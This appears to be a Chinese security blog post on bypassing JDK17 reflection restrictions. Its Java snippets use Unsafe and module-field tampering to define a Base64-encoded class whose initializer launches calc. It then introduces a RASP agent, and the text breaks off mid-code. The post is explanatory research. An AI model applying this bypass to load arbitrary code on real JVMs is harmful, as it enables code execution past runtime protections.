<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="8e17c0d2b2ddc35696f664562191626d">前言</h1>
<p>逛公众号的时候看到的一些接触的很少的东西，顺带着学习学习。</p>
<h1 data-content="1" id="b71ea6823e785906cc0159d777ec7b34">JDK17限制反射</h1>
<p>在<code>JDK9</code>至<code>JDK16</code>版本之中，<code>Java.*</code>依赖包下所有的非公共字段和方法在进行反射调用的时候，会出现关于非法反射访问的警告，但是在<code>JDK17</code>之后，采用的是强封装，默认情况下不再允许这一类的反射，所有反射访问<code>java.*</code>的非公共字段和方法的代码将抛出<code>InaccessibleObjectException</code>异常。<code>Oracle</code>给的解释是这种反射的使用对<code>JDK</code>的<strong>安全性</strong>和<strong>可维护性</strong>产生了负面影响。</p>
<p>例子：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.example.jdk17bypass.demos</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationTargetException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">IllegalAccessException</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAthdHRhY2suamF2YQwACgALBwAdDAAeAB8BAARjYWxjDAAgACEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAIgEABmF0dGFjawEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAACAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAAAwAIAA4ACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAABgAJAAkADAAHAA0ACAAWAAoADwAAAAcAAkwHABAJAAEAEQAAAAIAEg=="</span><span class="o">;</span>

        <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>

        <span class="n">Method</span> <span class="n">defineClass</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">defineClass</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Class</span> <span class="n">evil</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">defineClass</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">(),</span> <span class="s">"attack"</span><span class="o">,</span> <span class="n">decode</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">decode</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215335-c2fed7b2-daf7-1.png"/></p>
<h1 data-content="1" id="7820439636921ca25bc39be295929149">Unsafe绕过</h1>
<p><code>JDK11</code>之前可以利用<code>Unsafe</code>来调用并加载非<code>public</code>类</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
       <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAthdHRhY2suamF2YQwACgALBwAdDAAeAB8BAARjYWxjDAAgACEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAIgEABmF0dGFjawEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAACAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAAAwAIAA4ACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAABgAJAAkADAAHAA0ACAAWAAoADwAAAAcAAkwHABAJAAEAEQAAAAIAEg=="</span><span class="o">;</span>
       <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
       <span class="n">ClassLoader</span> <span class="n">classLoader</span><span class="o">=</span><span class="n">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">();</span>
       <span class="n">Field</span> <span class="n">theUafeField</span><span class="o">=</span><span class="n">Unsafe</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"theUnsafe"</span><span class="o">);</span>
       <span class="n">theUafeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
       <span class="n">Unsafe</span> <span class="n">unsafe</span><span class="o">=</span> <span class="o">(</span><span class="n">Unsafe</span><span class="o">)</span> <span class="n">theUafeField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
       <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">c2</span><span class="o">=</span><span class="n">unsafe</span><span class="o">.</span><span class="na">defineClass</span><span class="o">(</span><span class="s">"attack"</span><span class="o">,</span><span class="n">decode</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">decode</span><span class="o">.</span><span class="na">length</span><span class="o">,</span><span class="n">classLoader</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
       <span class="n">c2</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
   <span class="o">}</span>
</pre></div>
<p>但是在<code>JDK11</code>的时候，<code>Unsafe.defineClass</code>方法被移除并且默认禁止跨包之间反射调用非公共方法，在<code>JDK11</code>的时候，依旧可以使用<code>defineAnonymousClass</code>来触发，因为<code>defineAnonymousClass</code>没有被删除。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAthdHRhY2suamF2YQwACgALBwAdDAAeAB8BAARjYWxjDAAgACEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAIgEABmF0dGFjawEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAACAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAAAwAIAA4ACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAABgAJAAkADAAHAA0ACAAWAAoADwAAAAcAAkwHABAJAAEAEQAAAAIAEg=="</span><span class="o">;</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">theUafeField</span><span class="o">=</span><span class="n">Unsafe</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"theUnsafe"</span><span class="o">);</span>
        <span class="n">theUafeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Unsafe</span> <span class="n">unsafe</span><span class="o">=</span> <span class="o">(</span><span class="n">Unsafe</span><span class="o">)</span> <span class="n">theUafeField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">c2</span><span class="o">=</span><span class="n">unsafe</span><span class="o">.</span><span class="na">defineAnonymousClass</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Class"</span><span class="o">),</span><span class="n">decode</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
        <span class="n">c2</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
    <span class="o">}</span>
</pre></div>
<p>来到<code>JDK17</code>，以上的两种方法都发现被删除掉了。那么如何绕过这种反射的限制？根据<code>Oracle</code>的描述，在<code>sun.misc</code>和<code>sun.reflect</code>包可供所有<code>JDK版本（包括JDK17）</code>中的工具和库反射，所以可以利用这里面的依赖中的<code>Unsafe</code>类来绕过这种限制，<code>Unsafe</code>是位于<code>sun.misc</code>包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，拥有了类似C语言指针一样操作内存空间的能力。</p>
<p>因为上图的异常是从<code>checkCanSetAccessible</code>方法中抛出的，所以查看<code>setAccessible</code>的处理方法：</p>
<p>通过<code>Reflection.getCallerClass()</code>获取调用者的类的信息和各种方法，随后将获取到<code>caller</code>后与<code>ClassLoader</code>类一同传入到了<code>checkCanSetAccessible</code>方法中，在<code>checkCanSetAccessible</code>方法中，会先判断获取到的类信息是否是<code>MethodHandle</code>，如果是会抛出异常。接着通过<code>getModule()</code>获取<code>caller</code>和<code>ClassLoader</code>的<code>module</code>，如果它们两个的<code>module</code>是一致的，就会返回<code>True</code></p>
<p><code>MethodHandle</code>类提供了一种在调用方法时绕过Java语言访问控制和类型检查的方式，可以用来动态调用方法、字段和构造函数。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215000-42abaaea-daf7-1.png"/></p>
<blockquote>
<p>这里所说的<code>Unsafe</code>类绕过，就是通过<code>Unsafe</code>更改当前类通过<code>getModule</code>获取到的<code>Module</code>与<code>ClassLoader</code>的一致，从而完成绕过。</p>
</blockquote>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.example.jdk17bypass.demos</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">sun.misc.Unsafe</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationTargetException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">NoSuchFieldException</span><span class="o">,</span> <span class="n">InstantiationException</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAthdHRhY2suamF2YQwACgALBwAdDAAeAB8BAARjYWxjDAAgACEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAIgEABmF0dGFjawEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAACAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAAAwAIAA4ACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAABgAJAAkADAAHAA0ACAAWAAoADwAAAAcAAkwHABAJAAEAEQAAAAIAEg=="</span><span class="o">;</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">unSafe</span><span class="o">=</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.misc.Unsafe"</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">unSafeField</span><span class="o">=</span><span class="n">unSafe</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"theUnsafe"</span><span class="o">);</span>
        <span class="n">unSafeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Unsafe</span> <span class="n">unSafeClass</span><span class="o">=</span> <span class="o">(</span><span class="n">Unsafe</span><span class="o">)</span> <span class="n">unSafeField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
        <span class="n">Module</span> <span class="n">baseModule</span><span class="o">=</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getModule</span><span class="o">();</span>
        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">currentClass</span><span class="o">=</span> <span class="n">Test</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
        <span class="kt">long</span> <span class="n">addr</span><span class="o">=</span><span class="n">unSafeClass</span><span class="o">.</span><span class="na">objectFieldOffset</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"module"</span><span class="o">));</span>
        <span class="n">unSafeClass</span><span class="o">.</span><span class="na">getAndSetObject</span><span class="o">(</span><span class="n">currentClass</span><span class="o">,</span><span class="n">addr</span><span class="o">,</span><span class="n">baseModule</span><span class="o">);</span> <span class="c1">//更改当前运行类的Module</span>
        <span class="n">Method</span> <span class="n">defineClass</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">defineClass</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">calc</span><span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;)</span> <span class="n">defineClass</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">(),</span> <span class="s">"attack"</span><span class="o">,</span> <span class="n">decode</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">decode</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
        <span class="n">calc</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215015-4bd7f2c2-daf7-1.png"/></p>
<h1 data-content="1" id="8ea2304da29ebb36952f104734a54d2d">关于RASP</h1>
<p><code>RASP</code>全称是<code>Runtime applicaion self-protection</code>，在<code>2014</code>念提出的一种应用程序自我保护技术，将防护功能注入到应用程序之中，通过少量的<code>Hook</code>函数监测程序的运行，根据当前的上下文环境实时阻断攻击事件。</p>
<p>目前<code>Java RASP</code>主要是通过<code>Instrumentation</code>编写<code>Agent</code>的形式，在<code>Agent</code>的<code>premain</code>和<code>agentmain</code>中加入检测类一般继承于<code>ClassFileTransformer</code>，当程序运行进来的时候，通过类中的<code>transform</code>检测字节码文件中是否有一些敏感的类文件，比如<code>ProcessImpl</code>等。简单的可以理解为通过<code>Instrumentation</code>来对<code>JVM</code>进行实时监控</p>
<p>Instrumentation API 提供了两个核心接口：<code>ClassFileTransformer</code> 和 <code>Instrumentation</code>。<code>ClassFileTransformer</code> 接口允许开发者在类加载前或类重新定义时对字节码进行转换。Instrumentation 接口则提供了启动时代理和重新定义类的能力</p>
<p>关于所说的<code>Java Agent</code>会存在<code>premain</code>和<code>agentmain</code>两个方法，不同之处在于：</p>
<ol>
<li>
<code>premain</code> 方法：<code>premain</code> 方法是在 Java 虚拟机启动时，在被代理的应用程序加载之前运行的。我们可以在 Agent 中的 <code>premain</code> 方法中执行一些初始化操作，并在应用程序启动之前对目标类进行修改。</li>
<li>
<code>agentmain</code> 方法：<code>agentmain</code> 方法是在 Java 虚拟机已经启动并且应用程序正在运行时，动态地加载一个 Java Agent。通过使用 <code>attach API</code>，我们可以将 Agent 动态地附加到正在运行的 Java 进程上。这样，我们可以在应用程序运行期间对目标类进行修改。</li>
</ol>
<p>例子:</p>
<p><code>Agent</code>类：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">com.example.jrasp.transform.RaspTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.UnsupportedEncodingException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.instrument.Instrumentation</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.net.URLDecoder</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Agent</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">Agent</span><span class="o">()</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="kd">protected</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">decodeArg</span><span class="o">(</span><span class="n">String</span> <span class="n">arg</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">UnsupportedEncodingException</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">arg</span><span class="o">,</span> <span class="s">"UTF-16"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">UnsupportedEncodingException</span> <span class="n">var2</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">URLDecoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">arg</span><span class="o">,</span> <span class="s">"UTF-8"</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArg</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">RaspTransformer</span> <span class="n">jndiManagerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RaspTransformer</span><span class="o">(</span><span class="n">inst</span><span class="o">);</span>
            <span class="n">inst</span><span class="o">.</span><span class="na">addTransformer</span><span class="o">(</span><span class="n">jndiManagerTransformer</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
            <span class="n">jndiManagerTransformer</span><span class="o">.</span><span class="na">retransform</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">var3</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>

    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">agentmain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArg</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">RaspTransformer</span> <span class="n">jndiManagerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RaspTransformer</span><span class="o">(</span><span class="n">inst</span><span class="o">);</span>
            <span class="n">inst</span><span class="o">.</span><span class="na">addTransformer</span><span class="o">(</span><span class="n">jndiManagerTransformer</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
            <span class="n">jndiManagerTransformer</span><span class="o">.</span><span class="na">retransform</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">var3</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>

    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<blockquote>
<p>通过<code>Instrumentation API</code>实现了<code>premain</code>和<code>agentmain</code>方法，创建了自定义的<code>RaspTransformer</code>类，将自定义的类添加进了<code>JVM</code>转换器列表，用于 Java 类加载过程中对类字节码进行转换，通过<code>retransform</code>进行二次转换，实现了<code>JVM</code>启动时和<code>JVM</code>运行中的检测。</p>
</blockquote>
<p><code>Rasp</code>类：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.instrument.ClassFileTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.instrument.IllegalClassFormatException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.instrument.Instrumentation</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.security.ProtectionDomain</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.CtMethod</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.LoaderClassPath</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RaspTransformer</span> <span class="kd">implements</span> <span class="n">ClassFileTransformer</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="n">String</span> <span class="n">targetClassName</span> <span class="o">=</span> <span class="s">"java.lang.ProcessImpl"</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="n">String</span> <span class="n">targetMethodName</span> <span class="o">=</span> <span class="s">"start"</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">RaspTransformer</span><span class="o">(</span><span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">inst</span> <span class="o">=</span> <span class="n">inst</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">transform</span><span class="o">(</span><span class="n">ClassLoader</span> <span class="n">loader</span><span class="o">,</span> <span class="n">String</span> <span class="n">className</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">classBeingRedefined</span><span class="o">,</span> <span class="n">ProtectionDomain</span> <span class="n">protectionDomain</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classfileBuffer</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IllegalClassFormatException</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"/"</span><span class="o">,</span> <span class="s">"."</span><span class="o">).</span><span class="na">equals</span><span class="o">(</span><span class="n">targetClassName</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[Vaccine] Start Patch JndiManager Lookup Method!"</span><span class="o">);</span>
            <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="n">CtMethod</span> <span class="n">ctMethod</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

            <span class="k">try</span> <span class="o">{</span>
                <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassPool</span><span class="o">();</span>
                <span class="n">classPool</span><span class="o">.</span><span class="na">appendSystemPath</span><span class="o">();</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">loader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">classPool</span><span class="o">.</span><span class="na">appendClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">LoaderClassPath</span><span class="o">(</span><span class="n">loader</span><span class="o">));</span>
                <span class="o">}</span>

                <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">classfileBuffer</span><span class="o">));</span>
                <span class="n">CtMethod</span><span class="o">[]</span> <span class="n">var9</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">getMethods</span><span class="o">();</span>
                <span class="kt">int</span> <span class="n">var10</span> <span class="o">=</span> <span class="n">var9</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

                <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var11</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var11</span> <span class="o">&lt;</span> <span class="n">var10</span><span class="o">;</span> <span class="o">++</span><span class="n">var11</span><span class="o">)</span> <span class="o">{</span>
